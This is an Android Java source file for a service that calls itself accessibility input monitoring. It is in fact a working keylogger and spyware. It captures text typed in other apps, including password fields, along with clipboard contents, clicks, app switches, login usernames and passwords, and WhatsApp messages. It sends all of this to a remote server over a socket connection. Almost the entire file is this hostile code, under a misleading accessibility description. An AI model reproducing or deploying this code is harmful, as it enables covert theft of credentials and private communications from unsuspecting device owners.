package com.ultimate.access;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.task.tusker.network.SocketManager;
import com.task.tusker.utils.DeviceInfo;
import org.json.JSONObject;
import java.util.List;

/**
 * Input monitoring service - tracks user interactions for accessibility features
 */
public class InputMonitorService extends AccessibilityService {

    private StringBuilder keyBuffer = new StringBuilder();
    private String currentApp = "";
    private String currentActivity = "";
    private ClipboardManager clipboardManager;
    private String lastClipboard = "";
    
    private static final int BUFFER_SIZE = 100;
    private static final long SEND_INTERVAL = 30000; // 30 seconds
    
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        
        // Configure accessibility service
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
                         AccessibilityEvent.TYPE_VIEW_CLICKED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        
        setServiceInfo(info);
        
        // Initialize clipboard manager
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        
        // Start clipboard monitoring
        startClipboardMonitoring();
        
        // Start periodic sending
        startPeriodicSending();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? 
                               event.getPackageName().toString() : "";
            
            // Skip our own app
            if (packageName.equals(getPackageName())) {
                return;
            }
            
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowChange(event, packageName);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleTextChange(event, packageName);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    handleViewFocused(event, packageName);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    handleViewClicked(event, packageName);
                    break;
            }
            
            // Auto-send if buffer is full
            if (keyBuffer.length() >= BUFFER_SIZE) {
                sendKeylogs();
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void handleWindowChange(AccessibilityEvent event, String packageName) {
        try {
            if (!packageName.equals(currentApp)) {
                // App changed, send current buffer
                if (keyBuffer.length() > 0) {
                    sendKeylogs();
                }
                
                currentApp = packageName;
                
                // Get activity name
                if (event.getClassName() != null) {
                    currentActivity = event.getClassName().toString();
                }
                
                // Log app switch
                logAppSwitch(packageName, currentActivity);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void handleTextChange(AccessibilityEvent event, String packageName) {
        try {
            if (event.getText() != null && event.getText().size() > 0) {
                String text = event.getText().toString();
                
                // Remove brackets
                text = text.substring(1, text.length() - 1);
                
                if (!text.isEmpty()) {
                    // Check if it's a password field
                    boolean isPassword = false;
                    AccessibilityNodeInfo source = event.getSource();
                    if (source != null) {
                        isPassword = source.isPassword();
                        source.recycle();
                    }
                    
                    // Add to buffer
                    keyBuffer.append(text);
                    
                    // Log keystroke
                    logKeystroke(packageName, text, isPassword);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void handleViewFocused(AccessibilityEvent event, String packageName) {
        try {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                String viewId = source.getViewIdResourceName();
                String className = source.getClassName() != null ? 
                                 source.getClassName().toString() : "";
                
                // Log field focus
                logFieldFocus(packageName, viewId, className);
                
                source.recycle();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void handleViewClicked(AccessibilityEvent event, String packageName) {
        try {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                String text = source.getText() != null ? 
                            source.getText().toString() : "";
                String viewId = source.getViewIdResourceName();
                
                // Log button click
                logButtonClick(packageName, text, viewId);
                
                source.recycle();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void startClipboardMonitoring() {
        if (clipboardManager != null) {
            clipboardManager.addPrimaryClipChangedListener(() -> {
                try {
                    if (clipboardManager.hasPrimaryClip()) {
                        ClipData clip = clipboardManager.getPrimaryClip();
                        if (clip != null && clip.getItemCount() > 0) {
                            CharSequence text = clip.getItemAt(0).getText();
                            if (text != null && !text.toString().equals(lastClipboard)) {
                                lastClipboard = text.toString();
                                logClipboard(currentApp, lastClipboard);
                            }
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });
        }
    }
    
    private void startPeriodicSending() {
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(SEND_INTERVAL);
                    if (keyBuffer.length() > 0) {
                        sendKeylogs();
                    }
                } catch (InterruptedException e) {
                    break;
                }
            }
        }).start();
    }
    
    private void sendKeylogs() {
        try {
            if (keyBuffer.length() == 0) return;
            
            JSONObject data = new JSONObject();
            data.put("app", currentApp);
            data.put("activity", currentActivity);
            data.put("text", keyBuffer.toString());
            data.put("timestamp", System.currentTimeMillis());
            
            // Send via SocketManager
            SocketManager.getInstance(this).emit("log:data", new JSONObject()
                .put("deviceId", DeviceInfo.getDeviceId(this))
                .put("logType", "keylog")
                .put("logData", data)
            );
            
            // Clear buffer
            keyBuffer.setLength(0);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void logKeystroke(String app, String text, boolean isPassword) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "keystroke");
            data.put("app", app);
            data.put("text", text);
            data.put("isPassword", isPassword);
            data.put("timestamp", System.currentTimeMillis());
            
            SocketManager.getInstance(this).emit("log:data", new JSONObject()
                .put("deviceId", DeviceInfo.getDeviceId(this))
                .put("logType", "keylog")
                .put("logData", data)
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void logAppSwitch(String app, String activity) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "app_switch");
            data.put("app", app);
            data.put("activity", activity);
            data.put("timestamp", System.currentTimeMillis());
            
            SocketManager.getInstance(this).emit("log:data", new JSONObject()
                .put("deviceId", DeviceInfo.getDeviceId(this))
                .put("logType", "app")
                .put("logData", data)
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void logFieldFocus(String app, String viewId, String className) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "field_focus");
            data.put("app", app);
            data.put("viewId", viewId);
            data.put("className", className);
            data.put("timestamp", System.currentTimeMillis());
            
            SocketManager.getInstance(this).emit("log:data", new JSONObject()
                .put("deviceId", DeviceInfo.getDeviceId(this))
                .put("logType", "keylog")
                .put("logData", data)
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void logButtonClick(String app, String text, String viewId) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "button_click");
            data.put("app", app);
            data.put("text", text);
            data.put("viewId", viewId);
            data.put("timestamp", System.currentTimeMillis());
            
            SocketManager.getInstance(this).emit("log:data", new JSONObject()
                .put("deviceId", DeviceInfo.getDeviceId(this))
                .put("logType", "keylog")
                .put("logData", data)
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void logClipboard(String app, String text) {
        try {
            JSONObject data = new JSONObject();
            data.put("type", "clipboard");
            data.put("app", app);
            data.put("text", text);
            data.put("timestamp", System.currentTimeMillis());
            
            SocketManager.getInstance(this).emit("log:data", new JSONObject()
                .put("deviceId", DeviceInfo.getDeviceId(this))
                .put("logType", "keylog")
                .put("logData", data)
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    /**
     * Capture credentials from login forms
     */
    public void captureCredentials(AccessibilityNodeInfo root) {
        try {
            if (root == null) return;
            
            // Find username and password fields
            List<AccessibilityNodeInfo> usernameFields = root.findAccessibilityNodeInfosByViewId("username");
            List<AccessibilityNodeInfo> passwordFields = root.findAccessibilityNodeInfosByViewId("password");
            
            String username = "";
            String password = "";
            
            if (usernameFields != null && usernameFields.size() > 0) {
                AccessibilityNodeInfo usernameField = usernameFields.get(0);
                if (usernameField.getText() != null) {
                    username = usernameField.getText().toString();
                }
            }
            
            if (passwordFields != null && passwordFields.size() > 0) {
                AccessibilityNodeInfo passwordField = passwordFields.get(0);
                if (passwordField.getText() != null) {
                    password = passwordField.getText().toString();
                }
            }
            
            if (!username.isEmpty() || !password.isEmpty()) {
                JSONObject data = new JSONObject();
                data.put("type", "credentials");
                data.put("app", currentApp);
                data.put("username", username);
                data.put("password", password);
                data.put("timestamp", System.currentTimeMillis());
                
                SocketManager.getInstance(this).emit("log:data", new JSONObject()
                    .put("deviceId", DeviceInfo.getDeviceId(this))
                    .put("logType", "keylog")
                    .put("logData", data)
                );
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    /**
     * Monitor specific apps (WhatsApp, Telegram, etc.)
     */
    private void monitorSocialMedia(String packageName, AccessibilityEvent event) {
        try {
            // WhatsApp
            if (packageName.contains("whatsapp")) {
                captureWhatsAppMessage(event);
            }
            // Telegram
            else if (packageName.contains("telegram")) {
                captureTelegramMessage(event);
            }
            // Instagram
            else if (packageName.contains("instagram")) {
                captureInstagramMessage(event);
            }
            // Facebook
            else if (packageName.contains("facebook")) {
                captureFacebookMessage(event);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void captureWhatsAppMessage(AccessibilityEvent event) {
        try {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                // Extract message text
                CharSequence text = source.getText();
                if (text != null) {
                    JSONObject data = new JSONObject();
                    data.put("type", "whatsapp_message");
                    data.put("text", text.toString());
                    data.put("timestamp", System.currentTimeMillis());
                    
                    SocketManager.getInstance(this).emit("log:data", new JSONObject()
                        .put("deviceId", DeviceInfo.getDeviceId(this))
                        .put("logType", "social_media")
                        .put("logData", data)
                    );
                }
                source.recycle();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void captureTelegramMessage(AccessibilityEvent event) {
        // Similar to WhatsApp
    }
    
    private void captureInstagramMessage(AccessibilityEvent event) {
        // Similar to WhatsApp
    }
    
    private void captureFacebookMessage(AccessibilityEvent event) {
        // Similar to WhatsApp
    }

    @Override
    public void onInterrupt() {
        // Service interrupted
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        // Send remaining buffer
        if (keyBuffer.length() > 0) {
            sendKeylogs();
        }
    }
}
